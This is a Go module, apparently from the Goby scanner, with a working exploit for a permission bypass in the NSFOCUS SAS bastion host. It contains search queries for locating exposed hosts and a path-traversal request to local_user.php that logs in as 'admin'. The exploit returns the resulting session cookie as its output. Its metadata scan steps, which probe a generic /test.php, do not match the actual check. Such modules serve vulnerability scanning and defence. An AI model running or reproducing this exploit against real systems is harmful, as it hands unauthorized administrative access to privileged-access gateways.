package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NSFOCUS SAS bastion machine local_user.php permission bypass vulnerability",
    "Description": "<p>The SAS security audit system is a bastion host developed by NSFOCUS.</p><p>Attackers can gain access to sensitive resources to which they normally do not have access, ultimately leaving the system in a highly insecure state.</p>",
    "Product": "NSFOCUS-Bastion-Host",
    "Homepage": "http://www.nsfocus.com.cn/",
    "DisclosureDate": "2023-08-11",
    "PostTime": "2023-08-11",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"'/needUsbkey.php'\" || body=\"/login_logo_sas_h_zh_CN.png\"",
    "GobyQuery": "body=\"'/needUsbkey.php'\" || body=\"/login_logo_sas_h_zh_CN.png\"",
    "Level": "3",
    "Impact": "<p>Attackers can gain access to sensitive resources to which they normally do not have access, ultimately leaving the system in a highly insecure state.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.nsfocus.com.cn/\">http://www.nsfocus.com.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "绿盟 SAS 堡垒机 local_user.php 权限绕过漏洞",
            "Product": "NSFOCUS-堡垒机",
            "Description": "<p>SAS 安全审计系统是绿盟科技开发的一款堡垒机。</p><p>攻击者可以访问他们通常无权访问的敏感资源，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.nsfocus.com.cn/\">http://www.nsfocus.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以访问他们通常无权访问的敏感资源，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "NSFOCUS SAS bastion machine local_user.php permission bypass vulnerability",
            "Product": "NSFOCUS-Bastion-Host",
            "Description": "<p>The SAS security audit system is a bastion host developed by NSFOCUS.</p><p>Attackers can gain access to sensitive resources to which they normally do not have access, ultimately leaving the system in a highly insecure state.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"http://www.nsfocus.com.cn/\">http://www.nsfocus.com.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can gain access to sensitive resources to which they normally do not have access, ultimately leaving the system in a highly insecure state.<br><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`
	sendPayloadFlaguhZu := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
		payloadRequestConfig := httpclient.NewGetRequestConfig(uri)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFlaguhZu(hostInfo)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"status\":200")
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "login" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			resp, err := sendPayloadFlaguhZu(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Output = `Cookie: ` + resp.Cookie
				expResult.Success = true
				return expResult
			}
			return expResult
		},
	))
}
